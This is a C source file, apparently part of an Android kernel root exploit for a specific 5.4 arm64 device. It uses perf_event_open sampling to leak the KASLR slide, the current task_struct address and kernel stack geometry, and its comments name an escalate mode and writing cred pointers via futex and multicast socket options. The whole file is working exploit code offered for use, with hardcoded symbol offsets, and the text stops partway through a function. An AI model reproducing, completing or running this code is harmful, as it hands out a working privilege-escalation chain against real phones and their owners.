/* perf.c - KASLR slide leak via perf_event_open kernel-IP sampling.
 * Works under rish (shell, uid 2000): perf_event_paranoid=-1, no seccomp.
 * Returns the runtime _stext VA (KIMAGE_STEXT_LINK + slide).
 *
 * Also leaks the current task_struct from __schedule's `mrs x27, sp_el0`
 * (used by --escalate; see perf_leak_task below).
 */
#include "common.h"
#include <linux/hw_breakpoint.h>
#include <linux/perf_event.h>
#include <sys/ioctl.h>

#define STEXT_LINK KIMAGE_STEXT_LINK
#define ETEXT_LINK KIMAGE_ETEXT_LINK

struct perf_text_symbol {
  uint32_t rva;
  uint32_t size;
  const char *name;
};

/* Hot entry, timer, scheduler, and syscall symbols in the DBY2-W00 5.4
 * vmlinux. Sampled kernel IPs vote for a 2 MiB-aligned slide; the symbol
 * ranges then provide an independent containment check. */
static const struct perf_text_symbol perf_syms[] = {
  {0x000024d0, 0x454, "__do_softirq"},
  {0x00003000, 0x78c, "vectors"},
  {0x00004580, 0x1c4, "el1_irq"},
  {0x00004f80, 0x1d0, "el0_irq"},
  {0x002abc1c, 0x088, "el0_svc_handler"},
  {0x002abca4, 0x19c, "el0_svc_common"},
  {0x002cd39c, 0x088, "irq_enter"},
  {0x002cd424, 0x0c0, "irq_exit"},
  {0x002e5454, 0x02c, "__arm64_sys_getpid"},
  {0x00308ed8, 0x0e8, "update_rq_clock"},
  {0x0030c9f0, 0x1fc, "finish_task_switch"},
  {0x0030d23c, 0x380, "scheduler_tick"},
  {0x0031047c, 0x020, "__arm64_sys_sched_yield"},
  {0x0036cfd8, 0x2c4, "__handle_domain_irq"},
  {0x00374dd0, 0x40c, "handle_percpu_devid_irq"},
  {0x00394ac8, 0x09c, "update_process_times"},
  {0x00394b64, 0x060, "run_local_timers"},
  {0x00397140, 0x34c, "hrtimer_interrupt"},
  {0x0039748c, 0x4ac, "__hrtimer_run_queues"},
  {0x00397e28, 0x15c, "__arm64_sys_nanosleep"},
  {0x003ada74, 0x18d4, "do_futex"},
  {0x003b1304, 0x16c, "__arm64_sys_futex"},
  {0x00464b68, 0x4a0, "perf_event_task_tick"},
  {0x0052c594, 0x29c, "do_sys_open"},
  {0x0052c860, 0x034, "__arm64_sys_openat"},
  {0x0052c9dc, 0x04c, "__arm64_sys_close"},
  {0x0052d5a0, 0x15c, "vfs_read"},
  {0x0052dc78, 0x0e4, "ksys_read"},
  {0x0052dd5c, 0x028, "__arm64_sys_read"},
  {0x00540dc8, 0x15c, "do_filp_open"},
  {0x0055c274, 0x038, "get_unused_fd_flags"},
  {0x0055c2ac, 0x0b0, "put_unused_fd"},
  {0x0055ca60, 0x0c4, "__fdget_pos"},
  {0x00822be8, 0x150, "security_file_permission"},
  {0x01b142e0, 0xa5c, "__schedule"},
};
#define PERF_NSYMS (sizeof(perf_syms)/sizeof(perf_syms[0]))
#define PERF_MAXIPS 65536

static uint64_t perf_ips[PERF_MAXIPS];
static int perf_nips = 0;

static void perf_addip(uint64_t ip) {
  for (int i = 0; i < perf_nips; i++) {
    if (perf_ips[i] == ip) return;
  }
  if (perf_nips < PERF_MAXIPS) {
    perf_ips[perf_nips++] = ip;
  }
}

static int perf_sample_ips(void) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.size = sizeof(pe);
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.sample_period = 1;
  pe.sample_type = PERF_SAMPLE_IP;
  pe.exclude_kernel = 0;
  pe.exclude_hv = 0;
  pe.exclude_user = 1;
  pe.disabled = 1;
  pe.wakeup_events = 1;
  int fd = syscall(SYS_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) {
    pr_warning("perf_open errno=%d\n", errno);
    return -1;
  }
  int pg = (int)sysconf(_SC_PAGESIZE);
  size_t sz = (size_t)pg * 129;
  void *base = mmap(NULL, sz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (base == MAP_FAILED) {
    close(fd);
    return -1;
  }
  struct perf_event_mmap_page *meta = (struct perf_event_mmap_page *)base;
  char *data = (char *)base + pg;
  ioctl(fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  char buf[64];
  volatile int acc = 0;
  for (int i = 0; i < 400000; i++) {
    int f = open("/dev/null", O_RDONLY);
    if (f >= 0) {
      acc += (int)read(f, buf, 1);
      close(f);
    }
    acc += (int)syscall(SYS_getpid);
  }
  (void)acc; /* keep the loop effective */
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  __sync_synchronize();
  uint64_t head = meta->data_head;
  __sync_synchronize();
  uint64_t tail = meta->data_tail;
  uint64_t wrap = sz - (size_t)pg;
  uint64_t pos = tail;
  int nsamp = 0, nkern = 0;
  while (pos != head && nsamp < 400000) {
    struct perf_event_header *h = (struct perf_event_header *)(data + (pos % wrap));
    if (h->type != PERF_RECORD_SAMPLE) {
      pos += h->size;
      continue;
    }
    uint64_t ip = *(uint64_t *)((char *)h + 8);
    nsamp++;
    if (ip >= 0xffff000000000000ULL) {
      nkern++;
      perf_addip(ip);
    }
    pos += h->size;
  }
  meta->data_tail = head;
  munmap(base, sz);
  close(fd);
  return nkern;
}

/* Returns the runtime _stext VA, or 0 on failure. */
uint64_t perf_leak_stext(void) {
  perf_nips = 0;
  int nkern = perf_sample_ips();
  if (nkern < 0) {
    return 0;
  }
  if (perf_nips < 5) {
    pr_warning("perf too few kernel IPs (%d)\n", perf_nips);
    return 0;
  }
  uint64_t lo = ~0ULL, hi = 0;
  for (int i = 0; i < perf_nips; i++) {
    if (perf_ips[i] < lo) lo = perf_ips[i];
    if (perf_ips[i] > hi) hi = perf_ips[i];
  }
  /* 聚类法: 每个 (ip, 符号链接地址) 对产生 slide 候选 s = (ip - sym) &
     ~0x1fffff。runtime slide 是 2MB 对齐的, 众数 bin 就是 slide; 函数内偏移
     被掩掉, 单个文本段外异常 IP 也不会让整轮失败。 */
  #define PERF_SLIDE_CAND 4096
  static uint64_t cand[PERF_SLIDE_CAND];
  static int cand_n[PERF_SLIDE_CAND];
  int ncand = 0;
  for (int i = 0; i < perf_nips && ncand < PERF_SLIDE_CAND; i++) {
    for (int j = 0; j < (int)PERF_NSYMS; j++) {
      uint64_t sym = KIMAGE_TEXT_BASE + perf_syms[j].rva;
      if (perf_ips[i] < sym) {
        continue;
      }
      uint64_t s = (perf_ips[i] - sym) & ~0x1fffffULL;
      int found = 0;
      for (int k = 0; k < ncand; k++) {
        if (cand[k] == s) {
          cand_n[k]++;
          found = 1;
          break;
        }
      }
      if (!found) {
        cand[ncand] = s;
        cand_n[ncand] = 1;
        ncand++;
      }
    }
  }
  int best_n = 0;
  uint64_t best_slide = 0;
  for (int k = 0; k < ncand; k++) {
    if (cand_n[k] > best_n) {
      best_n = cand_n[k];
      best_slide = cand[k];
    }
  }
  /* 验证: 该 slide 使 >=3 个不同 IP 落文本区且与符号对齐 */
  int ver = 0;
  uint64_t link_lo = ~0ULL;
  uint64_t link_hi = 0;
  int link_in_text = 0;
  for (int i = 0; i < perf_nips; i++) {
    uint64_t link = perf_ips[i] - best_slide;
    if (link < link_lo) {
      link_lo = link;
    }
    if (link > link_hi) {
      link_hi = link;
    }
    if (link < STEXT_LINK || link >= ETEXT_LINK) {
      continue;
    }
    link_in_text++;
    for (int j = 0; j < (int)PERF_NSYMS; j++) {
      uint64_t sym = KIMAGE_TEXT_BASE + perf_syms[j].rva;
      if (link >= sym && link < sym + perf_syms[j].size) {
        ver++;
        break;
      }
    }
  }
  int symbol_verified = ver >= 3 && (ncand <= 1 || best_n >= 2);
  int containment_verified =
      best_n >= 64 && ncand >= 4 && perf_nips >= 128 &&
      link_in_text * 100 >= perf_nips * 80 &&
      link_hi - link_lo >= 0x100000ULL;
  if (!symbol_verified && !containment_verified) {
    pr_warning("perf slide cluster weak: best_n=%d ver=%d ncand=%d "
               "slide=%016llx link=[%016llx,%016llx] in_text=%d\n",
               best_n, ver, ncand, (unsigned long long)best_slide,
               (unsigned long long)link_lo, (unsigned long long)link_hi,
               link_in_text);
    for (int i = 0; i < perf_nips && i < 12; i++) {
      pr_info("perf sample ip[%d]=%016llx link=%016llx\n", i,
              (unsigned long long)perf_ips[i],
              (unsigned long long)(perf_ips[i] - best_slide));
    }
    return 0;
  }
  uint64_t stext = STEXT_LINK + best_slide;
  pr_success("perf-kaslr samples=%d kernel_ips=%d lo=%016llx hi=%016llx "
             "slide=%016llx stext=%016llx (cluster best_n=%d ver=%d "
             "in_text=%d)\n",
             nkern, perf_nips, (unsigned long long)lo, (unsigned long long)hi,
             (unsigned long long)best_slide, (unsigned long long)stext,
             best_n, ver, link_in_text);
  return stext;
}

/* ---- perf-based current-task leak (ported from mrx-w09-ghostlock) --------
 * Sample PERF_COUNT_SW_CPU_CLOCK with PERF_SAMPLE_REGS_INTR while spinning in
 * sched_yield(): samples that land inside __schedule after `mrs x27, sp_el0`
 * carry x27 == current (GOT-W29: +0x40, x27 never reassigned; function spans
 * to +0x1d58).  PERF_SAMPLE_TID filters to our own thread, so the winning
 * candidate is OUR task_struct; the list is frequency-ranked because samples
 * inside __schedule can also fire for prev/next tasks. */

#define SCHEDULE_NREG 33 /* x0..x30, sp, pc (perf_event_arm_regs) */
#define SCHEDULE_REGMASK ((1ULL << SCHEDULE_NREG) - 1)
#define SCHEDULE_X27_SLOT 27
#define TASK_PID_X21_SLOT 21
#define GET_USER_ARG_X8_SLOT 8
/* TCG-friendly tuning: a perf overflow is a hrtimer interrupt and those cost
 * ~0.2 ms each under TCG ("hrtimer: interrupt took ... ns" in the guest log),
 * so a 500 ns period (mrx on real hardware) never finishes here.  100 us of
 * CPU time per sample with a trigger that enters __schedule once per call is
 * still plenty. */
#define SCHEDULE_SAMPLE_PERIOD 100000
#define SCHEDULE_TRIGGER_ITERS 20000

uint64_t perf_task_cand[PERF_TASK_CAND_MAX];
unsigned perf_task_cnt[PERF_TASK_CAND_MAX];
int perf_task_ncand;
uint64_t perf_task_user_cand;

/* sched_yield() does not enter __schedule on a CPU with a single runnable task
 * (verified: samples=1248, in_sched=0), so trigger with tiny nanosleeps: every
 * call schedules the thread out through __schedule. */
static void leak_trigger(void) {
  static char *invalid_argv[] = {(char *)1, NULL};
  for (long i = 0; i < g_opts.task_trigger_iters; i++) {
    /* The competitor keeps this yield meaningful; nanosleep then forces a
     * second transition through __schedule on the same CPU. */
    (void)syscall(SYS_sched_yield);
    /* getpid() reaches __task_pid_nr_ns() with x21 == current.  The short
     * interruptible window is sampled even when __schedule itself is not. */
    (void)syscall(SYS_getpid);
    (void)syscall(SYS_getpid);
    for (int attempt = 0; attempt < 4; attempt++) {
      (void)syscall(SYS_execve, "/system/bin/true", invalid_argv, NULL);
    }
    struct timespec ts;
    ts.tv_sec = 0;
    ts.tv_nsec = 1000; /* 1us */
    (void)syscall(SYS_nanosleep, &ts, NULL);
  }
}

static atomic_int task_competitor_stop;
static atomic_int task_competitor_ready;

/* A lone pinned thread can sleep and wake without spending enough time in the
 * observable part of __schedule.  The successful waiter-thread run had an
 * owner thread competing for the same CPU.  Keep an equivalent runnable
 * opponent alive while sampling so the trigger exercises the schedule entry
 * instead of mostly the long switch tail. */
static void *task_competitor_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  /* This thread inherits the broker's comm.  Direct-cred mode writes one
   * task's cred pointers, so keep the competitor from passing the source
   * task's comm check. */
  (void)prctl(PR_SET_NAME, "gltaskcmp", 0, 0, 0);
  atomic_store(&task_competitor_ready, 1);
  while (!atomic_load(&task_competitor_stop)) {
    /* Stay runnable so the sampler's main thread must actually yield the CPU
     * rather than only waking from an idle nanosleep. */
    (void)syscall(SYS_sched_yield);
  }
  return NULL;
}

static uint64_t perf_ring_u64(const char *ring, uint64_t size, uint64_t pos) {
  uint64_t v = 0;
  uint64_t off = pos & (size - 1);
  uint64_t first = size - off;
  if (first >= 8) {
    memcpy(&v, ring + off, 8);
  } else {
    memcpy(&v, ring + off, first);
    memcpy((char *)&v + first, ring, 8 - first);
  }
  return v;
}

static uint32_t perf_ring_u32(const char *ring, uint64_t size, uint64_t pos) {
  uint32_t v = 0;
  uint64_t off = pos & (size - 1);
  uint64_t first = size - off;
  if (first >= 4) {
    memcpy(&v, ring + off, 4);
  } else {
    memcpy(&v, ring + off, first);
    memcpy((char *)&v + first, ring, 4 - first);
  }
  return v;
}

/* Returns the most frequent candidate (also fills the global list for the
 * escalate probe loop), or 0 on failure. */
static uint64_t perf_leak_task_common(pid_t target_pid, int sample_self) {
  uint64_t sched = SLIDE_SCHEDULE_IMAGE + kaslr_slide;
  uint64_t pid_ns = SLIDE_TASK_PID_NS_IMAGE + kaslr_slide;
  uint64_t get_user_arg = SLIDE_GET_USER_ARG_PTR_IMAGE + kaslr_slide;
  uint32_t mytid = (uint32_t)syscall(SYS_gettid);
  uint32_t sample_tid = sample_self ? mytid : (uint32_t)target_pid;
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_HARDWARE;
  pe.size = sizeof(pe);
  pe.config = PERF_COUNT_HW_CPU_CYCLES;
  pe.sample_period = (uint64_t)g_opts.task_sample_period;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_TID | PERF_SAMPLE_CALLCHAIN |
                   PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = SCHEDULE_REGMASK;
  pe.sample_max_stack = 16;
  pe.disabled = 1;
  pe.exclude_user = 0;
  pe.exclude_hv = 0;
  int event_pid = sample_self ? (g_opts.task_percpu ? -1 : 0) : target_pid;
  int event_cpu =
      sample_self && g_opts.task_percpu ? runtime_cpu : -1;
  int fd = syscall(SYS_perf_event_open, &pe, event_pid, event_cpu, -1, 0);
  if (fd < 0) {
    pr_warning("perf task leak: perf_event_open errno=%d\n", errno);
    return 0;
  }
  int pg = (int)sysconf(_SC_PAGESIZE);
  size_t sz = (size_t)pg * 129;
  void *base = mmap(NULL, sz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (base == MAP_FAILED) {
    close(fd);
    return 0;
  }
  struct perf_event_mmap_page *meta = (struct perf_event_mmap_page *)base;
  ioctl(fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);

  pthread_t competitor;
  int have_competitor = 0;
  if (sample_self) {
    atomic_store(&task_competitor_stop, 0);
    atomic_store(&task_competitor_ready, 0);
    if (pthread_create(&competitor, NULL, task_competitor_thread, NULL) == 0) {
      have_competitor = 1;
      while (!atomic_load(&task_competitor_ready)) {
        (void)syscall(SYS_sched_yield);
      }
    } else {
      pr_warning("perf task competitor pthread_create errno=%d\n", errno);
    }
    leak_trigger();
    atomic_store(&task_competitor_stop, 1);
    if (have_competitor) {
      pthread_join(competitor, NULL);
    }
  } else {
    /* A remote target is awakened by its real owner.  Shell cannot signal
     * system daemons, so do not manufacture SIGSTOP/SIGCONT traffic. */
    for (int wait = 0; wait < 2000; wait++) {
      usleep(500);
    }
  }
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  __sync_synchronize();

  /* 5.4 does not reliably populate data_offset; the data ring starts after
     the metadata page, as in perf_sample_ips(). */
  const char *ring = (const char *)base + pg;
  uint64_t rsz = sz - (size_t)pg;
  uint64_t head = meta->data_head;
  __sync_synchronize();
  uint64_t tail = meta->data_tail;
  uint64_t cand[PERF_TASK_CAND_MAX] = {0};
  unsigned cnt[PERF_TASK_CAND_MAX] = {0};
  int nc = 0, nsamp = 0, nabi = 0, nin_sched = 0, nin_pid = 0, nwin = 0;
  int nfallback = 0;
  int ndbg = 0;
  int ndbg_all = 0;
  int ndbg_user = 0;
  perf_task_user_cand = 0;
  uint64_t dbg_ip[8] = {0};
  uint64_t dbg_x27[8] = {0};
  uint32_t dbg_tid[8] = {0};
  uint64_t dbg_all_ip[8] = {0};
  uint64_t dbg_user_x8[8] = {0};
  uint64_t dbg_user_regs[8][SCHEDULE_NREG] = {{0}};
  uint64_t off_lo = ~0ULL, off_hi = 0;
  uint64_t pid_off_lo = ~0ULL, pid_off_hi = 0;
  while (tail + sizeof(struct perf_event_header) <= head) {
    uint64_t o = tail & (rsz - 1);
    struct perf_event_header h;
    if (o + sizeof(h) <= rsz) {
      memcpy(&h, ring + o, sizeof(h));
    } else {
      uint64_t first = rsz - o;
      memcpy(&h, ring + o, first);
      memcpy((char *)&h + first, ring, sizeof(h) - first);
    }
    if (h.size < sizeof(h) || tail + h.size > head) {
      break;
    }
    if (h.type == PERF_RECORD_SAMPLE) {
      nsamp++;
      uint64_t ip = perf_ring_u64(ring, rsz, tail + sizeof(h));
      uint32_t stid = perf_ring_u32(ring, rsz, tail + sizeof(h) + 12);
      if (stid == sample_tid && ndbg_all < 8) {
        dbg_all_ip[ndbg_all++] = ip;
      }
      uint64_t p = tail + sizeof(h) + 16; /* skip IP + TID */
      uint64_t nr = perf_ring_u64(ring, rsz, p);
      p += 8 + nr * 8; /* CALLCHAIN */
      uint64_t abi = perf_ring_u64(ring, rsz, p);
      p += 8; /* REGS_INTR abi */
      if (abi) {
        nabi++;
        if (ip >= sched && ip < sched + 0x2000) {
          uint64_t off = ip - sched;
          nin_sched++;
          if (ndbg < 8) {
            dbg_ip[ndbg] = off;
            dbg_x27[ndbg] = perf_ring_u64(ring, rsz,
                                          p + SCHEDULE_X27_SLOT * 8);
            dbg_tid[ndbg] = stid;
            ndbg++;
          }
          if (off < off_lo) {
            off_lo = off;
          }
          if (off > off_hi) {
            off_hi = off;
          }
        }
        if (ip >= pid_ns && ip < pid_ns + 0x2000) {
          uint64_t off = ip - pid_ns;
          nin_pid++;
          if (off < pid_off_lo) {
            pid_off_lo = off;
          }
          if (off > pid_off_hi) {
            pid_off_hi = off;
          }
        }
      }
      if (abi && stid == sample_tid &&
          p + (uint64_t)SCHEDULE_NREG * 8 <= tail + h.size) {
        uint64_t candidate = 0;
        int have_candidate = 0;
        if (ip >= sched + SLIDE_SCHEDULE_WIN_START &&
            ip < sched + SLIDE_SCHEDULE_WIN_END) {
          candidate = perf_ring_u64(ring, rsz,
                                    p + SCHEDULE_X27_SLOT * 8);
          have_candidate = 1;
        } else if (ip >= pid_ns + SLIDE_TASK_PID_WIN_START &&
                   ip < pid_ns + SLIDE_TASK_PID_WIN_END) {
          candidate = perf_ring_u64(ring, rsz,
                                    p + TASK_PID_X21_SLOT * 8);
          have_candidate = 1;
        } else if (ip >= get_user_arg + SLIDE_GET_USER_ARG_WIN_START &&
                   ip < get_user_arg + SLIDE_GET_USER_ARG_WIN_END) {
          candidate = perf_ring_u64(ring, rsz,
                                    p + GET_USER_ARG_X8_SLOT * 8);
          if (!perf_task_user_cand &&
              candidate >= 0xffffff8000000000ULL &&
              candidate < 0xffffffc000000000ULL &&
              !(candidate & 0x7)) {
            perf_task_user_cand = candidate;
          }
          if (ndbg_user < 8) {
            dbg_user_x8[ndbg_user++] = candidate;
            for (int r = 0; r < SCHEDULE_NREG; r++) {
              dbg_user_regs[ndbg_user - 1][r] =
                  perf_ring_u64(ring, rsz, p + (uint64_t)r * 8);
            }
          }
          have_candidate = 1;
        } else {
          candidate = perf_ring_u64(ring, rsz,
                                    p + SCHEDULE_X27_SLOT * 8);
          have_candidate = 1;
          nfallback++;
        }
        /* __schedule keeps x27 == sp_el0; __task_pid_nr_ns keeps x21 ==
         * its task argument.  Both must point at an aligned task_struct. */
        if (have_candidate &&
            candidate >= 0xffffff8000000000ULL &&
            candidate < 0xffffffc000000000ULL &&
            !(candidate & 0x7)) {
          nwin++;
          int k;
          for (k = 0; k < nc; k++) {
            if (cand[k] == candidate) {
              cnt[k]++;
              break;
            }
          }
          if (k == nc && nc < PERF_TASK_CAND_MAX) {
            cand[k] = candidate;
            cnt[k] = 1;
            nc++;
          }
        }
      }
    }
    tail += h.size;
  }
  meta->data_tail = head;
  munmap(base, sz);
  close(fd);

  perf_task_ncand = nc;
  for (int i = 0; i < nc; i++) {
    perf_task_cand[i] = cand[i];
    perf_task_cnt[i] = cnt[i];
  }
  for (int i = 0; i < nc; i++) {
    for (int j = i + 1; j < nc; j++) {
      if (perf_task_cnt[j] > perf_task_cnt[i]) {
        uint64_t tc = perf_task_cand[i];
        perf_task_cand[i] = perf_task_cand[j];
        perf_task_cand[j] = tc;
        unsigned uc = perf_task_cnt[i];
        perf_task_cnt[i] = perf_task_cnt[j];
        perf_task_cnt[j] = uc;
      }
    }
  }
  pr_info("perf task leak: mode=%s period=%d iters=%d pid=%d tid=%u "
          "in_pid=%d pid_off=[0x%llx,0x%llx] "
          "samples=%d abi=%d in_sched=%d "
          "competitor=%d "
          "win_off=[0x%llx,0x%llx] in_window=%d fallback=%d "
          "cands=%d best=%016llx (n=%u)\n",
          sample_self ? (g_opts.task_percpu ? "cpus" : "task") : "remote",
          g_opts.task_sample_period, g_opts.task_trigger_iters,
          (int)target_pid, (unsigned)sample_tid, nin_pid,
          (unsigned long long)(nin_pid ? pid_off_lo : 0),
          (unsigned long long)pid_off_hi, nsamp, nabi, nin_sched,
          have_competitor,
          (unsigned long long)(nin_sched ? off_lo : 0),
          (unsigned long long)off_hi, nwin, nfallback, nc,
          (unsigned long long)(nc ? perf_task_cand[0] : 0),
          nc ? perf_task_cnt[0] : 0);
  if (nc == 0 && ndbg) {
    pr_info("perf task debug:");
    for (int i = 0; i < ndbg; i++) {
      pr_info(" sample%d off=%#llx tid=%u x27=%016llx", i,
              (unsigned long long)dbg_ip[i], dbg_tid[i],
              (unsigned long long)dbg_x27[i]);
    }
  }
  if (ndbg_all) {
    pr_info("perf task sample ips tid=%u:", (unsigned)sample_tid);
    for (int i = 0; i < ndbg_all; i++) {
      pr_info(" %016llx", (unsigned long long)dbg_all_ip[i]);
    }
    pr_info("\n");
  }
  if (ndbg_user) {
    pr_info("perf task get_user x8:");
    for (int i = 0; i < ndbg_user; i++) {
      pr_info(" %016llx", (unsigned long long)dbg_user_x8[i]);
    }
    pr_info("\n");
    for (int r = 0; r < SCHEDULE_NREG && ndbg_user > 0; r++) {
      pr_info("get_user reg[%d]=%016llx\n", r,
              (unsigned long long)dbg_user_regs[0][r]);
    }
  }
  return nc ? perf_task_cand[0] : 0;
}

uint64_t perf_leak_task(void) {
  return perf_leak_task_common(0, 1);
}

uint64_t perf_leak_task_pid(pid_t target_pid) {
  return perf_leak_task_common(target_pid, 0);
}

/* Measure the two kernel stack positions used by the exploit on this exact
 * device: the rt_mutex_waiter allocated by FUTEX_WAIT_REQUEUE_PI and the
 * group_source_req destination used by MCAST_BLOCK_SOURCE.  Both measurements
 * run in the same thread, and only SP is sampled to keep the perf ring small. */
#define GEOMETRY_LEAK_ITERS 100000
#define GEOMETRY_LEAK_SAMPLE_PERIOD_NS 1000
#define GEOMETRY_RING_PAGES 1024
#define GEOMETRY_ADDR23_REG 23
#define GEOMETRY_FRAME_POINTER_REG 29
#define GEOMETRY_SP_REG 31
#define GEOMETRY_PERF_TYPE_BREAKPOINT 5
#define GEOMETRY_BREAKPOINT_X 4
#define GEOMETRY_BREAKPOINT_LEN_4 HW_BREAKPOINT_LEN_4

char perf_waiter_diag[256];
uint64_t perf_mcast_copy_address;
int perf_mcast_waiter_offset;

static void geometry_add_candidate(
    uint64_t *candidates, unsigned *counts, int *candidate_count,
    uint64_t value) {
  if (value < 0xffffff8000000000ULL || (value & 7)) {
    return;
  }
  for (int i = 0; i < *candidate_count; i++) {
    if (candidates[i] == value) {
      counts[i]++;
      return;
    }
  }
  if (*candidate_count < 32) {
    candidates[*candidate_count] = value;
    counts[*candidate_count] = 1;
    (*candidate_count)++;
  }
}

static uint64_t geometry_best_candidate(
    const uint64_t *candidates, const unsigned *counts, int candidate_count,
    unsigned *best_count) {
  int best = -1;
  for (int i = 0; i < candidate_count; i++) {
    if (best < 0 || counts[i] > counts[best]) {
      best = i;
    }
  }
  if (best < 0) {
    *best_count = 0;
    return 0;
  }
  *best_count = counts[best];
  return candidates[best];
}

static uint64_t perf_futex_waiter_hwprobe(void) {
  uint64_t breakpoint =
      SLIDE_DO_FUTEX_IMAGE + kaslr_slide + 0x84;
  uint32_t mytid = (uint32_t)syscall(SYS_gettid);
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = GEOMETRY_PERF_TYPE_BREAKPOINT;
  pe.size = sizeof(pe);
  pe.config = 0;
  pe.sample_period = 1;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = 1ULL << GEOMETRY_SP_REG;
  pe.bp_type = GEOMETRY_BREAKPOINT_X;
  pe.bp_addr = breakpoint;
  pe.bp_len = GEOMETRY_BREAKPOINT_LEN_4;
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;

  int perf_fd = syscall(SYS_perf_event_open, &pe, (pid_t)mytid, -1, -1, 0);
  if (perf_fd < 0) {
    pr_warning("perf futex waiter probe open failed errno=%d tid=%u\n", errno,
               (unsigned)mytid);
    return 0;
  }

  int page_size = (int)sysconf(_SC_PAGESIZE);
  size_t mapping_size = (size_t)page_size * 2;
  void *mapping = mmap(NULL, mapping_size, PROT_READ | PROT_WRITE, MAP_SHARED,
                       perf_fd, 0);
  if (mapping == MAP_FAILED) {
    close(perf_fd);
    return 0;
  }

  struct perf_event_mmap_page *meta =
      (struct perf_event_mmap_page *)mapping;
  ioctl(perf_fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(perf_fd, PERF_EVENT_IOC_ENABLE, 0);
  uint32_t pi_word = 0;
  (void)syscall(SYS_futex, &pi_word,
                FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
  (void)syscall(SYS_futex, &pi_word,
                FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
  ioctl(perf_fd, PERF_EVENT_IOC_DISABLE, 0);
  __sync_synchronize();

  const char *ring = (const char *)mapping + page_size;
  uint64_t ring_size = mapping_size - (size_t)page_size;
  uint64_t head = meta->data_head;
  uint64_t tail = meta->data_tail;
  uint64_t waiter = 0;
  while (tail + sizeof(struct perf_event_header) <= head) {
    uint64_t offset = tail & (ring_size - 1);
    struct perf_event_header header;
    memcpy(&header, ring + offset, sizeof(header));
    if (header.size < sizeof(header) || tail + header.size > head) {
      break;
    }
    if (header.type == PERF_RECORD_SAMPLE) {
      uint64_t sample_offset = tail + sizeof(header);
      uint64_t abi =
          perf_ring_u64(ring, ring_size, sample_offset + 8);
      if (abi) {
        uint64_t sp =
            perf_ring_u64(ring, ring_size, sample_offset + 16);
        if (sp >= 0xffffff8000000000ULL) {
          waiter = sp + 0xe0;
          break;
        }
      }
    }
    tail += header.size;
  }

  meta->data_tail = head;
  munmap(mapping, mapping_size);
  close(perf_fd);
  return waiter;
}

uint64_t perf_leak_waiter(uint64_t do_futex_waiter_off) {
  perf_waiter_diag[0] = 0;
  perf_mcast_copy_address = 0;
  perf_mcast_waiter_offset = 0;

  uint64_t measured_waiter = perf_futex_waiter_hwprobe();
  uint64_t measured_copy = 0;
  int socket_fd = (int)syscall(SYS_socket, AF_INET, SOCK_DGRAM, 0);
  if (socket_fd >= 0 && perf_mcast_probe_begin()) {
    uint64_t mcast_buffer[MCAST_OPT_LEN / 8] __attribute__((aligned(4096)));
    memset(mcast_buffer, 0, sizeof(mcast_buffer));
    mcast_buffer[1] = AF_INET;
    mcast_buffer[0x88 / 8] = AF_INET;
    (void)syscall(SYS_setsockopt, socket_fd, SOL_IP, 43, mcast_buffer,
                  MCAST_OPT_LEN);
    measured_copy = perf_mcast_probe_end();
  }
  if (socket_fd >= 0) {
    close(socket_fd);
  }
  if (measured_waiter && measured_copy &&
      measured_waiter > measured_copy) {
    uint64_t measured_offset = measured_waiter - measured_copy;
    if (measured_offset <= MCAST_OPT_LEN - (WAITER_LOCK_OFF + 8) &&
        !(measured_offset & 7)) {
      perf_mcast_copy_address = measured_copy;
      perf_mcast_waiter_offset = (int)measured_offset;
      snprintf(perf_waiter_diag, sizeof(perf_waiter_diag),
               "hardware waiter=%016llx copy=%016llx delta=%#llx",
               (unsigned long long)measured_waiter,
               (unsigned long long)measured_copy,
               (unsigned long long)measured_offset);
      pr_warning("perf geometry leak: tid=%u %s\n",
                 (unsigned)syscall(SYS_gettid), perf_waiter_diag);
      return measured_waiter;
    }
  }

  uint64_t do_futex = SLIDE_DO_FUTEX_IMAGE + kaslr_slide;
  uint64_t do_ip_setsockopt = SLIDE_DO_IP_SETSOCKOPT_IMAGE + kaslr_slide;
  uint32_t mytid = (uint32_t)syscall(SYS_gettid);

  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.size = sizeof(pe);
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.sample_period = GEOMETRY_LEAK_SAMPLE_PERIOD_NS;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << GEOMETRY_FRAME_POINTER_REG) |
                        (1ULL << GEOMETRY_SP_REG);
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;

  int perf_fd = syscall(SYS_perf_event_open, &pe, (pid_t)mytid, -1, -1, 0);
  if (perf_fd < 0) {
    snprintf(perf_waiter_diag, sizeof(perf_waiter_diag),
             "open_fail errno=%d tid=%u", errno, (unsigned)mytid);
    pr_warning("perf geometry leak: perf_event_open tid=%u errno=%d\n",
               (unsigned)mytid, errno);
    return 0;
  }

  int page_size = (int)sysconf(_SC_PAGESIZE);
  size_t mapping_size = (size_t)page_size * (GEOMETRY_RING_PAGES + 1);
